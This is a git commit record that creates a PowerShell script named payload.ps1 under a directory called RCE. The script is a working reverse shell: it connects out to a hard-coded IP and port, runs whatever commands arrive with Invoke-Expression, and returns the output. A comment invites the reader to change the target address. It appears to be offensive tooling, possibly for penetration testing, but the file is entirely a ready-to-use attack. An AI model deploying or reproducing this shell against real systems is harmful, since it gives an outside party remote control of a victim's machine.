8d0ae9f0fdacb2629e95898ad926b9d81e0998fb
Eugene Kong <95288169+violin-ing@users.noreply.github.com>
2026-05-31 18:10:03 +0100

    Create payload.ps1

---
+++ scripts/RCE/payload.ps1
@@ -0,0 +1,31 @@
+do {
+    Start-Sleep -Seconds 1
+
+    # === CHANGE THE IP AND PORT HERE ===
+    try{
+        $TCPClient = New-Object Net.Sockets.TCPClient('192.168.49.57', 443)
+    } catch {}
+} until ($TCPClient.Connected)
+
+$NetworkStream = $TCPClient.GetStream()
+$StreamWriter = New-Object IO.StreamWriter($NetworkStream)
+
+function WriteToStream ($String) {
+    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}
+    $StreamWriter.Write($String + 'SHELL> ')
+    $StreamWriter.Flush()
+}
+
+WriteToStream ''
+
+while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
+    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
+    $Output = try {
+            Invoke-Expression $Command 2>&1 | Out-String
+        } catch {
+            $_ | Out-String
+        }
+
+    WriteToStream ($Output)
+}
+$StreamWriter.Close()
